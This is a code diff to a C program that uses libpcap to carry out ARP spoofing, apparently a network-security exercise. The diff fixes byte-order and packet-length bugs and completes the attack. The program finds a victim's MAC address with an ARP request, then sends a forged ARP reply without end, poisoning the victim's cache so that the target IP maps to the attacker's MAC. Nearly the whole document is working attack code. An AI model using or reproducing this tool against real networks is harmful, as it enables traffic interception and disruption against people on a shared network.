@@ -10,14 +10,20 @@
 #include <unistd.h>
 
 #define REQUEST 1
-#define APPLY 2
+#define REPLY 2
+#define ETH_HDR_LEN 14
+#define ETH_TYPE_ARP 0x0806
 
+
+// ethernet header
 struct ETHERNET {
 	uint8_t dmac[6];
 	uint8_t smac[6];
 	uint16_t type;
 };
 
+// arp header
+#pragma pack(1) // alloc memory to variables by 1 bytes (default is 4bytes)
 struct ARP {
 	uint16_t hdw_type;
 	uint16_t pro_type;
@@ -25,9 +31,9 @@ struct ARP {
 	uint8_t  pro_len;
 	uint16_t opcode;
 	uint8_t sender_mac[6];
-	uint32_t sender_ip;
+	uint32_t sender_ip :32;
 	uint8_t target_mac[6];
-	uint32_t target_ip;
+	uint32_t target_ip :32;
 };
 
 void print_mac(uint8_t *mac) {
@@ -38,6 +44,7 @@ void print_ip(uint32_t ip) {
 	printf("%d.%d.%d.%d\n", ip & 0xff, (ip>>8) & 0xff, (ip>>16) & 0xff, ip>>24);
 }
 
+
 ETHERNET make_eth_hdr(uint8_t *s_mac, uint8_t *d_mac) {
 	ETHERNET eth;
 	memcpy(&eth.dmac, d_mac, 6);
@@ -47,34 +54,23 @@ ETHERNET make_eth_hdr(uint8_t *s_mac, uint8_t *d_mac) {
 	return eth;
 }
 
+
 ARP make_arp_hdr(int opcode, uint8_t *sender_mac, uint32_t sender_ip, uint8_t *target_mac, uint32_t target_ip) {
-	printf("C");
 	ARP arp;
-	printf("B");
-	arp.hdw_type = 0x0001;
-	printf("A");
-	arp.pro_type = 0x0800;
-	printf("A");
+	arp.hdw_type = htons(0x0001);
+	arp.pro_type = htons(0x0800);
 	arp.hdw_len = 0x06;
-	printf("A");
 	arp.pro_len = 0x04;
-	printf("A");
-	arp.opcode =opcode;
-	printf("A");
+	arp.opcode = htons(opcode);
 	memcpy(&arp.sender_mac, sender_mac, 6);
-	printf("A");
 	arp.sender_ip = sender_ip;
-	printf("A");
 	memcpy(&arp.target_mac, target_mac, 6);
-	printf("A");
 	arp.target_ip = target_ip;
-	printf("A");
-
-
-	printf("%d %d %d %d %d \n",arp.hdw_type, arp.pro_type, arp.hdw_len, arp.pro_len, arp.opcode);
 	return arp;
 }
 
+
+// get my mac address from ioctl
 void getMacAddress(char *iface ,uint8_t *my_mac) {
 	int fd;
 	struct ifreq ifr;
@@ -93,6 +89,7 @@ void getMacAddress(char *iface ,uint8_t *my_mac) {
 	memcpy(my_mac, mac,6);
 }
 
+// get my ip address from ioctl
 void getIpAddress(char *iface, uint32_t &my_ip) {
 	int fd;
 	struct ifreq ifr;
@@ -111,28 +108,31 @@ void getIpAddress(char *iface, uint32_t &my_ip) {
 	my_ip = ip;
 }
 
+// make ARP packet
 void *make_arp(u_char *packet, uint8_t *s_mac, uint8_t *d_mac, int opcode, 
 		uint8_t *sender_mac, uint32_t sender_ip, uint8_t *target_mac, uint32_t target_ip, int *packet_len) {
 	
 	ETHERNET eth = make_eth_hdr(s_mac, d_mac);
 	ARP arp = make_arp_hdr(opcode, sender_mac, sender_ip, target_mac, target_ip);
-	print_ip(arp.sender_ip);
-	print_ip(arp.target_ip);
 	
 	memcpy(packet, &eth, sizeof(eth));
-	packet_len += sizeof(eth);
-	memcpy(packet+sizeof(eth), &arp, sizeof(arp));
-	packet_len += sizeof(arp);
+	*packet_len += sizeof(eth);
+	memcpy(packet+*packet_len, &arp, sizeof(arp));
+	*packet_len += sizeof(arp);
 }
 
+
+// find sender's mac address from sender's ip address by arp protocol
 int find_sender_mac(const u_char *packet, uint8_t *sender_mac, uint32_t sender_ip, uint32_t my_ip) {
 	ETHERNET *eth = (struct ETHERNET*) packet;
-	if (ntohs(eth->type) == 0x0806) {
-		printf("xxxxxxxx\n");
-		ARP *arp = (struct ARP*) &packet[14];
-		if (ntohs(arp->opcode) == 0x2 
-				&& ntohl(arp->target_ip) == my_ip 
-				&& ntohl(arp->sender_ip) == sender_ip) {
+	if (ntohs(eth->type) == ETH_TYPE_ARP) {
+		ARP *arp = (struct ARP*) &packet[ETH_HDR_LEN];
+
+		
+		if (htons(arp->opcode) == 0x2 			// if arp reply packet
+			&& arp->target_ip == my_ip 			// if destination ip is my ip
+			&& arp->sender_ip == sender_ip) {	// if source ip is sender ip
+
 			memcpy(sender_mac, arp->sender_mac, 6);
 			return 1;
 		}
@@ -170,14 +170,14 @@ int main(int argc, char *argv[]) {
 	uint32_t target_ip = inet_addr(argv[3]);
 	getIpAddress(argv[1], my_ip);
 
-	
-	printf("My MAC address\t\t: ");
+	printf("=================== ARP SPOOFING ===================\n");
+	printf("[+] My MAC address\t\t: ");
 	print_mac(my_mac);
-	printf("My IP address\t\t: ");
+	printf("[+] My IP address\t\t: ");
 	print_ip(my_ip);
-	printf("Attacker's MAC address\t: ");
+	printf("[+] Attacker's MAC address\t: ");
 	print_mac(my_mac);
-	printf("Attacker's IP address\t: ");
+	printf("[+] Attacker's IP address\t: ");
 	print_ip(target_ip);
 
 	
@@ -188,39 +188,45 @@ int main(int argc, char *argv[]) {
 		return -1;
 	}
 
-	// make packet and send
-
+	// make request packet (broadcast)
 	int packet_len = 0;
-	u_char *request_packet;
+	u_char request_packet[100];
 	memset(request_packet, 0, 100);
 
 	make_arp(request_packet, my_mac, broadcast_mac, REQUEST, my_mac, my_ip, unknown_mac, sender_ip, &packet_len);
 
-	for (int i=0; i<packet_len; i++)
-		printf("%02x ",request_packet[i]);
-
-	pcap_sendpacket(handle, request_packet, packet_len);
-
-	printf("send packet\n");
+	int count = 0;
 	while (true) {
+		// send requset packet until get sender's arp reply packet
+		if (count % 10 == 0) {
+			pcap_sendpacket(handle, request_packet, packet_len);
+			printf("\n[*] Send request packet to sender(victim)!\n");
+			count = 0;
+		}
 		struct pcap_pkthdr *header;
 		const u_char* packet;
 		int res = pcap_next_ex(handle, &header, &packet);
 		if (res == 0) continue;
 		if (res == -1 || res == -2) break;
 
-
-		printf("A\n");
 		if (find_sender_mac(packet, sender_mac, sender_ip, my_ip))
 			break;
 	}
 
-	printf("\nFind Victim's MAC address!!\n");
-	printf("Victim's MAC address\t: ");
+	printf("[*] Find Victim's MAC address!!\n");
+	printf("\n[+] Victim's MAC address\t: ");
 	print_mac(sender_mac);
-	printf("Victim's IP address\t: ");
+	printf("[+] Victim's IP address\t\t: ");
 	print_ip(sender_ip);
 
 	u_char attack_packet[100];
-	pcap_sendpacket(handle, attack_packet, sizeof(attack_packet));
+	memset(attack_packet, 0, 100);
+
+	// make attack packet (unicast)
+	packet_len = 0;
+	make_arp(attack_packet, my_mac, sender_mac, REPLY, my_mac, target_ip, sender_mac, sender_ip, &packet_len);
+
+	printf("\n[*] Sending attack packet to sender(victim)!\n");
+	while (true)
+		pcap_sendpacket(handle, attack_packet, sizeof(attack_packet));
 }
